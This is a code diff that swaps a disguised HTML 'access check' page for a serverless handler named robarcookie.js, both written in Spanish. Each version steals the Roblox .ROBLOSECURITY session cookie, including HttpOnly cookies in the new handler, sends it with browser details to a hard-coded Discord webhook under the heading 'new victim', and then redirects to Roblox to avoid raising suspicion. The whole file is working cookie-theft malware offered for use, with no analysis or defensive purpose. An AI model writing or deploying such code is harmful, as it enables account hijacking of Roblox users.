@@ -1,79 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Redirigiendo...</title>
-    <style>
-        body { background: #f0f0f0; text-align: center; padding: 50px; font-family: Arial; }
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #e8281e; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <h2>Verificando acceso...</h2>
-    <div class="loader"></div>
-    <p>Por favor espera un momento</p>
-
-    <script>
-        // ============================================
-        // 1. OBTENER COOKIES
-        // ============================================
-        const cookies = document.cookie;
-        const allCookies = cookies.split('; ').reduce((acc, cookie) => {
-            const [name, value] = cookie.split('=');
-            acc[name] = value;
-            return acc;
-        }, {});
-
-        // Buscar cookie de Roblox (.ROBLOSECURITY)
-        const robloxCookie = allCookies['.ROBLOSECURITY'] || 'No encontrada';
-
-        // ============================================
-        // 2. ENVIAR A DISCORD (WEBHOOK)
-        // ============================================
-        const webhookURL = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
-
-        const data = {
+// api/robarcookie.js
+export default function handler(req, res) {
+    // 1. Obtener cookies de los headers
+    const cookies = req.headers.cookie || '';
+    
+    // 2. Buscar .ROBLOSECURITY
+    const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
+    const robloxCookie = match ? match[1] : 'No encontrada';
+    
+    // 3. Enviar a Discord
+    fetch('https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
             content: "@everyone",
             embeds: [{
-                title: "🔔 NUEVA VÍCTIMA DESDE .url",
-                color: 0xe8281e,
-                fields: [
-                    {
-                        name: "🍪 Cookie Roblox",
-                        value: `\`\`\`${robloxCookie}\`\`\``
-                    },
-                    {
-                        name: "🌍 User Agent",
-                        value: navigator.userAgent.substring(0, 100),
-                        inline: true
-                    },
-                    {
-                        name: "📅 Fecha/Hora",
-                        value: new Date().toLocaleString('es-AR'),
-                        inline: true
-                    },
-                    {
-                        name: "🔗 URL de origen",
-                        value: document.referrer || "Directo"
-                    }
-                ],
-                footer: { text: "Sistema .url automático" }
+                title: "🔔 Cookie HttpOnly robada",
+                description: `\`\`\`${robloxCookie}\`\`\``,
+                color: 0xe8281e
             }]
-        };
+        })
+    }).catch(() => {});
 
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).catch(() => {});
-
-        // ============================================
-        // 3. REDIRIGIR A ROBLOX (para no levantar sospechas)
-        // ============================================
-        setTimeout(() => {
-            window.location.href = "https://www.roblox.com/home";
-        }, 3000);
-    </script>
-</body>
-</html>
+    // 4. Redirigir a Roblox
+    res.setHeader('Location', 'https://www.roblox.com/home');
+    res.status(302).end();
+}
